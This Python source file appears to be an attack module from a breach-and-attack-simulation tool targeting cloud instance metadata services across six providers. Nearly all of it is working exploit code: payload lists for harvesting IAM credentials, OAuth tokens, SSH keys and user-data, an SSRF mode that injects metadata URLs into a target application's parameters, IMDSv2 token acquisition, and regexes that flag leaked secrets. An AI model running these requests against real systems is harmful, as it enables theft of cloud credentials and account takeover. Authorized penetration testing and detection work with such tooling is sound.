"""
Cloud Metadata Service Exploitation module.

Tests for access to cloud instance metadata services (IMDS) across
AWS, GCP, Azure, DigitalOcean, Oracle Cloud, and Alibaba Cloud.
Detects credential exposure, IAM role enumeration, and user-data leaks.

MITRE ATT&CK: T1552.005 - Unsecured Credentials: Cloud Instance Metadata API
"""

from __future__ import annotations

import re
import uuid
from typing import Any

from bas.core.executor import AttackRequest, AttackResponse
from bas.core.scope import AuthorizationLevel
from bas.modules.base_module import BaseAttackModule, ModuleMetadata, ModuleResult, VulnStatus


# ── AWS IMDSv1 / IMDSv2 payloads ──────────────────────────────────────────────
AWS_METADATA_PAYLOADS = [
    # IMDSv1 – direct GET (no token required)
    "/latest/meta-data/",
    "/latest/meta-data/ami-id",
    "/latest/meta-data/instance-id",
    "/latest/meta-data/instance-type",
    "/latest/meta-data/hostname",
    "/latest/meta-data/local-ipv4",
    "/latest/meta-data/public-ipv4",
    "/latest/meta-data/public-hostname",
    "/latest/meta-data/mac",
    "/latest/meta-data/security-groups",
    "/latest/meta-data/placement/availability-zone",
    "/latest/meta-data/placement/region",
    # IAM credential harvesting
    "/latest/meta-data/iam/info",
    "/latest/meta-data/iam/security-credentials/",
    "/latest/meta-data/iam/security-credentials/admin-role",
    "/latest/meta-data/iam/security-credentials/ec2-role",
    "/latest/meta-data/iam/security-credentials/default",
    # User-data (startup scripts, may contain secrets)
    "/latest/user-data",
    "/latest/user-data/",
    # Identity document (account ID, region)
    "/latest/dynamic/instance-identity/document",
    "/latest/dynamic/instance-identity/signature",
    # Network info
    "/latest/meta-data/network/interfaces/macs/",
    # IMDSv2 token endpoint (PUT)
    "IMDSv2_TOKEN_REQUEST",
]

# ── GCP payloads ───────────────────────────────────────────────────────────────
GCP_METADATA_PAYLOADS = [
    "/computeMetadata/v1/",
    "/computeMetadata/v1/project/",
    "/computeMetadata/v1/project/project-id",
    "/computeMetadata/v1/project/numeric-project-id",
    "/computeMetadata/v1/project/attributes/",
    "/computeMetadata/v1/project/attributes/ssh-keys",
    "/computeMetadata/v1/instance/",
    "/computeMetadata/v1/instance/hostname",
    "/computeMetadata/v1/instance/id",
    "/computeMetadata/v1/instance/zone",
    "/computeMetadata/v1/instance/machine-type",
    "/computeMetadata/v1/instance/name",
    "/computeMetadata/v1/instance/tags",
    "/computeMetadata/v1/instance/network-interfaces/",
    "/computeMetadata/v1/instance/service-accounts/",
    "/computeMetadata/v1/instance/service-accounts/default/token",
    "/computeMetadata/v1/instance/service-accounts/default/email",
    "/computeMetadata/v1/instance/service-accounts/default/scopes",
    "/computeMetadata/v1/instance/attributes/",
    "/computeMetadata/v1/instance/attributes/kube-env",
    "/computeMetadata/v1/instance/attributes/startup-script",
]

# ── Azure IMDS payloads ───────────────────────────────────────────────────────
AZURE_METADATA_PAYLOADS = [
    "/metadata/instance?api-version=2021-02-01",
    "/metadata/instance/compute?api-version=2021-02-01",
    "/metadata/instance/compute/name?api-version=2021-02-01&format=text",
    "/metadata/instance/compute/resourceGroupName?api-version=2021-02-01&format=text",
    "/metadata/instance/compute/subscriptionId?api-version=2021-02-01&format=text",
    "/metadata/instance/compute/vmId?api-version=2021-02-01&format=text",
    "/metadata/instance/compute/osType?api-version=2021-02-01&format=text",
    "/metadata/instance/compute/location?api-version=2021-02-01&format=text",
    "/metadata/instance/network?api-version=2021-02-01",
    "/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
    "/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net",
    "/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://graph.microsoft.com/",
    "/metadata/instance/compute/userData?api-version=2021-01-01&format=text",
]

# ── DigitalOcean metadata payloads ─────────────────────────────────────────────
DIGITALOCEAN_METADATA_PAYLOADS = [
    "/metadata/v1.json",
    "/metadata/v1/",
    "/metadata/v1/id",
    "/metadata/v1/hostname",
    "/metadata/v1/region",
    "/metadata/v1/interfaces/",
    "/metadata/v1/dns/nameservers",
    "/metadata/v1/floating_ip/ipv4/active",
    "/metadata/v1/tags/",
    "/metadata/v1/user-data",
    "/metadata/v1/vendor-data",
]

# ── Oracle Cloud (OCI) metadata payloads ───────────────────────────────────────
OCI_METADATA_PAYLOADS = [
    "/opc/v1/instance/",
    "/opc/v1/instance/id",
    "/opc/v1/instance/metadata/",
    "/opc/v1/instance/metadata/ssh_authorized_keys",
    "/opc/v1/instance/metadata/user_data",
    "/opc/v1/identity/",
    "/opc/v2/instance/",
    "/opc/v2/instance/metadata/",
]

# ── Alibaba Cloud metadata payloads ────────────────────────────────────────────
ALIBABA_METADATA_PAYLOADS = [
    "/latest/meta-data/",
    "/latest/meta-data/instance-id",
    "/latest/meta-data/hostname",
    "/latest/meta-data/region-id",
    "/latest/meta-data/ram/security-credentials/",
]

# Cloud provider → base host mapping
CLOUD_HOSTS = {
    "aws": "http://169.254.169.254",
    "gcp": "http://metadata.google.internal",
    "azure": "http://169.254.169.254",
    "digitalocean": "http://169.254.169.254",
    "oci": "http://169.254.169.254",
    "alibaba": "http://100.100.100.200",
}

# Response indicators per provider
CLOUD_INDICATORS: list[tuple[str, str, str, str]] = [
    # (pattern, description, severity, provider)
    ("ami-id", "AWS EC2 metadata exposed – AMI ID", "high", "aws"),
    ("instance-id", "Instance identity metadata exposed", "high", "aws"),
    ("iam", "IAM metadata endpoint reachable", "critical", "aws"),
    ("AccessKeyId", "AWS temporary credentials exposed", "critical", "aws"),
    ("SecretAccessKey", "AWS secret access key exposed", "critical", "aws"),
    ("Token", "AWS session token exposed", "critical", "aws"),
    ("security-credentials", "IAM security-credentials listing accessible", "critical", "aws"),
    ("accountId", "AWS account ID exposed", "high", "aws"),
    ("availabilityZone", "AWS availability zone metadata exposed", "medium", "aws"),
    ("computeMetadata", "GCP metadata API reachable", "high", "gcp"),
    ("project-id", "GCP project ID exposed", "high", "gcp"),
    ("service-accounts", "GCP service account metadata accessible", "critical", "gcp"),
    ("access_token", "GCP/Azure OAuth access token exposed", "critical", "gcp"),
    ("ssh-keys", "GCP SSH keys metadata exposed", "critical", "gcp"),
    ("kube-env", "GKE kube-env exposed – may contain kubelet credentials", "critical", "gcp"),
    ("azEnvironment", "Azure IMDS accessible", "high", "azure"),
    ("subscriptionId", "Azure subscription ID exposed", "high", "azure"),
    ("resourceGroupName", "Azure resource group name exposed", "medium", "azure"),
    ("vmId", "Azure VM ID exposed", "medium", "azure"),
    ("access_token", "Azure managed identity token exposed", "critical", "azure"),
    ("droplet_id", "DigitalOcean droplet metadata exposed", "high", "digitalocean"),
    ("user-data", "Instance user-data accessible (may contain secrets)", "high", "any"),
    ("userData", "Instance user-data accessible (may contain secrets)", "high", "any"),
    ("vendor-data", "Vendor-data endpoint accessible", "medium", "digitalocean"),
    ("opc", "Oracle Cloud instance metadata exposed", "high", "oci"),
    ("ram", "Alibaba Cloud RAM credentials reachable", "critical", "alibaba"),
]


def _build_full_payloads() -> list[dict[str, str]]:
    """Produce a list of dicts with provider, host, path, and extra headers."""
    entries: list[dict[str, str]] = []

    def _add(provider: str, host: str, paths: list[str], extra_headers: dict[str, str] | None = None) -> None:
        for path in paths:
            entry: dict[str, str] = {
                "provider": provider,
                "url": f"{host}{path}",
                "path": path,
            }
            if extra_headers:
                entry["extra_headers"] = str(extra_headers)
            entries.append(entry)

    _add("aws", CLOUD_HOSTS["aws"], AWS_METADATA_PAYLOADS)
    _add("gcp", CLOUD_HOSTS["gcp"], GCP_METADATA_PAYLOADS, {"Metadata-Flavor": "Google"})
    _add("azure", CLOUD_HOSTS["azure"], AZURE_METADATA_PAYLOADS, {"Metadata": "true"})
    _add("digitalocean", CLOUD_HOSTS["digitalocean"], DIGITALOCEAN_METADATA_PAYLOADS)
    _add("oci", CLOUD_HOSTS["oci"], OCI_METADATA_PAYLOADS)
    _add("alibaba", CLOUD_HOSTS["alibaba"], ALIBABA_METADATA_PAYLOADS)

    return entries


ALL_METADATA_PAYLOADS = _build_full_payloads()


class CloudMetadataModule(BaseAttackModule):
    """
    Cloud Instance Metadata Service (IMDS) exploitation.

    Tests for reachability of cloud metadata endpoints across AWS, GCP, Azure,
    DigitalOcean, Oracle Cloud, and Alibaba Cloud.  Detects credential exposure,
    IAM role enumeration, user-data leakage, and access-token theft.
    """

    @property
    def metadata(self) -> ModuleMetadata:
        return ModuleMetadata(
            name="cloud_metadata",
            description=(
                "Cloud metadata service exploitation – AWS IMDSv1/v2, GCP, Azure, "
                "DigitalOcean, Oracle Cloud, Alibaba credential and identity exposure"
            ),
            category="infrastructure",
            mitre_technique_ids=["T1552.005"],
            mitre_technique_names=["Unsecured Credentials: Cloud Instance Metadata API"],
            auth_level_required=AuthorizationLevel.STANDARD,
            owasp_category="A01:2021 - Broken Access Control",
            cwe_ids=["CWE-200", "CWE-522"],
            tags=["cloud", "metadata", "imds", "aws", "gcp", "azure", "credentials", "infrastructure"],
        )

    async def _get_payloads(self, target: str, options: dict[str, Any]) -> list[str]:
        """Return serialised payload descriptors as strings."""
        if self._payload_db:
            db_payloads = await self._payload_db.get_payloads("cloud_metadata", limit=200)
            if db_payloads:
                return db_payloads

        provider_filter = options.get("providers")
        payloads = ALL_METADATA_PAYLOADS
        if provider_filter:
            allowed = {p.lower() for p in provider_filter}
            payloads = [p for p in payloads if p["provider"] in allowed]

        return [p["url"] for p in payloads]

    def _build_requests(
        self, target: str, payloads: list[str], options: dict[str, Any]
    ) -> list[AttackRequest]:
        requests: list[AttackRequest] = []
        use_ssrf = options.get("ssrf_mode", False)
        ssrf_param = options.get("ssrf_param", "url")

        for payload_url in payloads:
            req_id = str(uuid.uuid4())[:8]
            headers: dict[str, str] = {"X-BAS-Payload": payload_url}

            # Determine provider-specific headers
            if "metadata.google.internal" in payload_url:
                headers["Metadata-Flavor"] = "Google"
            elif "/metadata/" in payload_url and "169.254.169.254" in payload_url:
                # Azure requires Metadata: true
                if "api-version=" in payload_url:
                    headers["Metadata"] = "true"

            if payload_url == "IMDSv2_TOKEN_REQUEST":
                # IMDSv2 token acquisition request
                requests.append(AttackRequest(
                    request_id=f"cloud-imdsv2-{req_id}",
                    target=target if use_ssrf else "http://169.254.169.254",
                    method="PUT",
                    path="/latest/api/token",
                    headers={
                        "X-aws-ec2-metadata-token-ttl-seconds": "21600",
                        "X-BAS-Payload": payload_url,
                    },
                    timeout=options.get("timeout", 10.0),
                    follow_redirects=False,
                ))
                continue

            if use_ssrf:
                # Inject as SSRF parameter against the real target
                requests.append(AttackRequest(
                    request_id=f"cloud-ssrf-{req_id}",
                    target=target,
                    method=options.get("method", "GET"),
                    path=options.get("path", "/"),
                    params={ssrf_param: payload_url},
                    headers=headers,
                    timeout=options.get("timeout", 10.0),
                    follow_redirects=False,
                ))
            else:
                # Direct metadata access (for internal/container testing)
                from urllib.parse import urlparse
                parsed = urlparse(payload_url)
                meta_host = f"{parsed.scheme}://{parsed.netloc}"
                meta_path = parsed.path
                if parsed.query:
                    meta_path = f"{meta_path}?{parsed.query}"
                requests.append(AttackRequest(
                    request_id=f"cloud-direct-{req_id}",
                    target=meta_host,
                    method="GET",
                    path=meta_path,
                    headers=headers,
                    timeout=options.get("timeout", 5.0),
                    follow_redirects=False,
                ))

        return requests

    def _analyze_response(
        self, request: AttackRequest, response: AttackResponse, payload: str
    ) -> ModuleResult:
        body = response.body_text
        payload_used = request.headers.get("X-BAS-Payload", payload)

        if response.error:
            return ModuleResult(
                module_name="cloud_metadata",
                target=request.target,
                status=VulnStatus.NOT_VULNERABLE,
                payload_used=payload_used,
                response_code=response.status_code,
                elapsed_ms=response.elapsed_ms,
                detail={"error": response.error},
            )

        # IMDSv2 token response
        if "IMDSv2_TOKEN_REQUEST" in payload_used:
            if response.status_code == 200 and len(body.strip()) > 10:
                return ModuleResult(
                    module_name="cloud_metadata",
                    target=request.target,
                    status=VulnStatus.VULNERABLE,
                    payload_used=payload_used,
                    response_code=response.status_code,
                    response_body_preview=body[:200],
                    elapsed_ms=response.elapsed_ms,
                    evidence="IMDSv2 token acquired – full metadata access possible with token",
                    severity="critical",
                    mitre_technique_id="T1552.005",
                    detail={"detection_type": "imdsv2_token", "provider": "aws"},
                )

        # Check against indicator list
        for indicator, desc, severity, provider in CLOUD_INDICATORS:
            if indicator.lower() in body.lower():
                return ModuleResult(
                    module_name="cloud_metadata",
                    target=request.target,
                    status=VulnStatus.VULNERABLE,
                    payload_used=payload_used,
                    response_code=response.status_code,
                    response_body_preview=body[:500],
                    elapsed_ms=response.elapsed_ms,
                    evidence=f"Cloud metadata exposed: {desc} (indicator: '{indicator}')",
                    severity=severity,
                    mitre_technique_id="T1552.005",
                    detail={
                        "detection_type": "cloud_metadata",
                        "indicator": indicator,
                        "provider": provider,
                    },
                )

        # Credential-specific regex checks
        cred_patterns = [
            (r"AKIA[0-9A-Z]{16}", "AWS access key ID found in metadata response", "critical"),
            (r"(?i)\"AccessKeyId\"\s*:\s*\"[A-Z0-9]+\"", "AWS temporary credentials in JSON response", "critical"),
            (r"(?i)\"SecretAccessKey\"\s*:\s*\"[A-Za-z0-9/+=]+\"", "AWS secret key in JSON response", "critical"),
            (r"(?i)\"Token\"\s*:\s*\"[A-Za-z0-9/+=]+\"", "AWS session token in metadata", "critical"),
            (r"eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+", "JWT / OAuth token found in metadata", "critical"),
            (r"-----BEGIN (RSA |EC )?PRIVATE KEY-----", "Private key material in metadata", "critical"),
            (r"(?i)password\s*[=:]\s*\S+", "Password found in user-data or metadata", "critical"),
        ]
        for pattern, desc, severity in cred_patterns:
            if re.search(pattern, body):
                return ModuleResult(
                    module_name="cloud_metadata",
                    target=request.target,
                    status=VulnStatus.VULNERABLE,
                    payload_used=payload_used,
                    response_code=response.status_code,
                    response_body_preview=body[:500],
                    elapsed_ms=response.elapsed_ms,
                    evidence=f"Credential leak via cloud metadata: {desc}",
                    severity=severity,
                    mitre_technique_id="T1552.005",
                    detail={"detection_type": "credential_regex", "pattern": pattern},
                )

        # Generic 200 with a body from a known metadata host
        if response.status_code == 200 and len(body.strip()) > 0:
            if any(h in payload_used for h in ("169.254.169.254", "metadata.google.internal", "100.100.100.200")):
                return ModuleResult(
                    module_name="cloud_metadata",
                    target=request.target,
                    status=VulnStatus.POTENTIALLY_VULNERABLE,
                    payload_used=payload_used,
                    response_code=response.status_code,
                    response_body_preview=body[:500],
                    elapsed_ms=response.elapsed_ms,
                    evidence=(
                        f"Metadata endpoint returned HTTP 200 with {len(body)} bytes – "
                        "manual verification recommended"
                    ),
                    severity="medium",
                    mitre_technique_id="T1552.005",
                    detail={"detection_type": "generic_200"},
                )

        return ModuleResult(
            module_name="cloud_metadata",
            target=request.target,
            status=VulnStatus.NOT_VULNERABLE,
            payload_used=payload_used,
            response_code=response.status_code,
            elapsed_ms=response.elapsed_ms,
        )
